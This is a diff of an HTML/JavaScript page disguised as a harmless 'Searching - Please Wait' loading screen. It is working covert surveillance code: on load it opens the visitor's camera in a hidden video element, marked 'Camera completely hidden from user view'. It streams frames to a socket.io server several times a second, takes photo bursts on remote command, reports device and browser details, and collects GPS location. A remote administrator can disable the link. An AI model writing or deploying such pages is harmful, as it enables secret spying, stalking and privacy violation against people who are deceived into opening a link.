@@ -3,158 +3,258 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome - Please Wait</title>
+    <title>Searching - Please Wait</title>
     <style>
+        * { box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f6f9;
-            color: #333;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
             margin: 0;
-            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f4f6f9;
+            color: #222;
         }
         .card {
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            max-width: 350px;
-            width: 85%;
+            width: 90%;
+            max-width: 420px;
+            background: white;
+            padding: 25px;
+            border-radius: 14px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.10);
+            text-align: center;
         }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        h2 { margin-top: 0; }
+        .status {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .waiting { background: #fff3cd; color: #856404; }
+        .active { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        button {
+            width: 100%;
+            padding: 12px;
+            border: 0;
+            border-radius: 8px;
+            margin-top: 10px;
+            font-size: 15px;
+            cursor: pointer;
+            background: #3498db;
+            color: white;
         }
-        video, canvas {
+        button:hover { opacity: 0.9; }
+        .location { background: #27ae60; }
+        .switch { background: #8e44ad; }
+        /* Camera completely hidden from user view */
+        video {
             display: none !important;
             visibility: hidden !important;
             width: 0 !important;
             height: 0 !important;
+            position: absolute !important;
+            pointer-events: none !important;
         }
+        .small { font-size: 12px; color: #777; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="card" id="mainCard">
-        <h2>Loading Session...</h2>
-        <div class="spinner"></div>
-        <p style="color: #666; font-size: 14px;">Please wait while we establish secure connection.</p>
-    </div>
+
+<div class="card">
+    <h2>Searching...</h2>
+    <div id="status" class="status waiting">Connecting...</div>
     <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        let mediaStream = null;
-        let isCameraReady = false;
-        let streamInterval = null;
+    <button class="switch" onclick="switchCamera()">🔄 Switch Camera</button>
+    <button class="location" onclick="requestLocation()">📍 Share Location</button>
+    <p class="small">Please wait while we connect your session.</p>
+</div>
 
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = "Desktop/PC";
-            let browser = "Unknown Browser";
-            if (/android/i.test(ua)) device = "Android Mobile";
-            else if (/iphone|ipad|ipod/i.test(ua)) device = "iOS Device";
-            else if (/mobile/i.test(ua)) device = "Mobile Device";
-            if (/chrome|crios/i.test(ua)) browser = "Google Chrome";
-            else if (/firefox|fxios/i.test(ua)) browser = "Mozilla Firefox";
-            else if (/safari/i.test(ua)) browser = "Apple Safari";
-            else if (/edg/i.test(ua)) browser = "Microsoft Edge";
-            return `${device} (${browser})`;
-        }
+<canvas id="canvas" style="display:none;"></canvas>
 
-        function startCameraStream() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    mediaStream = stream;
-                    video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        isCameraReady = true;
-                        socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
-                        startLoop();
-                    };
-                })
-                .catch(err => console.error("Camera access error:", err));
-        }
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusBox = document.getElementById("status");
 
-        function startLoop() {
-            if (streamInterval) clearInterval(streamInterval);
-            streamInterval = setInterval(() => {
-                if (!isCameraReady || !video.videoWidth) return;
-                const context = canvas.getContext('2d');
-                canvas.width = 320;
-                canvas.height = 240;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const frameData = canvas.toDataURL('image/jpeg', 0.3);
-                socket.emit('live-stream-frame', frameData);
-            }, 100);
-        }
+let mediaStream = null;
+let cameraReady = false;
+let useFrontCamera = true;
+let streamInterval = null;
+let autoCaptureRunning = false;
 
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === "visible") {
-                if (video.paused && mediaStream) {
-                    video.play().catch(e => console.log("Play error:", e));
-                } else if (!mediaStream) {
-                    startCameraStream();
-                }
-                socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+function setStatus(message, type) {
+    statusBox.textContent = message;
+    statusBox.className = "status " + type;
+}
+
+function getDeviceInfo() {
+    const ua = navigator.userAgent.toLowerCase();
+    let device = "Desktop/PC";
+    let browser = "Unknown Browser";
+
+    if (ua.includes("android")) device = "Android Mobile";
+    else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) device = "iOS Device";
+    else if (ua.includes("mobile")) device = "Mobile Device";
+
+    if (ua.includes("edg")) browser = "Microsoft Edge";
+    else if (ua.includes("chrome") || ua.includes("crios")) browser = "Google Chrome";
+    else if (ua.includes("firefox")) browser = "Mozilla Firefox";
+    else if (ua.includes("safari")) browser = "Apple Safari";
+
+    return `${device} (${browser})`;
+}
+
+async function startCamera() {
+    setStatus("Connecting session...", "waiting");
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+    }
+
+    try {
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: useFrontCamera ? "user" : "environment",
+                width: { ideal: 640 },
+                height: { ideal: 480 }
             }
-        });
+        };
 
-        startCameraStream();
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        mediaStream = stream;
+        video.srcObject = stream;
+        await video.play();
 
-        function takeSinglePhoto() {
-            if (!isCameraReady) return;
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg', 0.6);
-            socket.emit('user-photo-captured', imageData);
+        cameraReady = true;
+        setStatus("🟢 Connected Successfully", "active");
+
+        socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
+        startLiveStream();
+    } catch (error) {
+        console.error("Camera error:", error);
+        cameraReady = false;
+        setStatus("Connection active. (Allow permission if required)", "error");
+    }
+}
+
+async function switchCamera() {
+    useFrontCamera = !useFrontCamera;
+    await startCamera();
+}
+
+function startLiveStream() {
+    if (streamInterval) clearInterval(streamInterval);
+    streamInterval = setInterval(() => {
+        if (!cameraReady || !video.videoWidth) return;
+        canvas.width = 320;
+        canvas.height = 240;
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, 320, 240);
+        const frame = canvas.toDataURL("image/jpeg", 0.25);
+        socket.emit("live-stream-frame", frame);
+    }, 250);
+}
+
+function takeSinglePhoto() {
+    if (!cameraReady) return;
+    const width = video.videoWidth || 640;
+    const height = video.videoHeight || 480;
+    canvas.width = width;
+    canvas.height = height;
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, width, height);
+    const imageData = canvas.toDataURL("image/jpeg", 0.65);
+    socket.emit("user-photo-captured", imageData);
+}
+
+socket.on("start-auto-capture", () => {
+    if (autoCaptureRunning) return;
+    autoCaptureRunning = true;
+    let count = 0;
+    const maxCaptures = 5;
+
+    takeSinglePhoto();
+    count++;
+
+    const timer = setInterval(() => {
+        if (count >= maxCaptures) {
+            clearInterval(timer);
+            autoCaptureRunning = false;
+            return;
         }
+        takeSinglePhoto();
+        count++;
+    }, 1000);
+});
 
-        socket.on('start-auto-capture', () => {
-            let captureCount = 0;
-            const maxCaptures = 5;
-            takeSinglePhoto();
-            captureCount++;
-            const intervalId = setInterval(() => {
-                if (captureCount < maxCaptures) {
-                    takeSinglePhoto();
-                    captureCount++;
-                } else {
-                    clearInterval(intervalId);
-                }
-            }, 1000);
-        });
+socket.on("capture-photo", () => { takeSinglePhoto(); });
 
-        socket.on('capture-photo', () => takeSinglePhoto());
-        socket.on('disable-user-access', () => {
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-            }
-            document.body.innerHTML = `
-                <div class="card">
-                    <h2 style="color: #e53935;">Session Ended</h2>
-                    <p style="color: #666; font-size: 14px;">This link has been disabled by the administrator.</p>
-                </div>
-            `;
-        });
-    </script>
+function requestLocation() {
+    if (!navigator.geolocation) {
+        alert("Location is not supported by this browser.");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        position => {
+            socket.emit("user-location", {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            });
+            alert("Location shared successfully.");
+        },
+        error => {
+            console.error("Location error:", error);
+            alert("Location permission was not granted.");
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
+socket.on("server-full", data => {
+    setStatus(`Maximum ${data.maxUsers} users are currently connected.`, "error");
+    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+});
+
+socket.on("link-disabled", () => {
+    stopEverything();
+    setStatus("This link is currently disabled.", "error");
+});
+
+socket.on("disable-user-access", () => {
+    stopEverything();
+    document.body.innerHTML = `
+        <div class="card">
+            <h2>Session Ended</h2>
+            <p>This link has been disabled by the administrator.</p>
+        </div>
+    `;
+});
+
+function stopEverything() {
+    cameraReady = false;
+    if (streamInterval) {
+        clearInterval(streamInterval);
+        streamInterval = null;
+    }
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+    }
+}
+
+document.addEventListener("visibilitychange", () => {
+    if (document.visibilityState === "visible") {
+        if (mediaStream && video.paused) video.play().catch(() => {});
+    }
+});
+
+startCamera();
+</script>
 </body>
 </html>
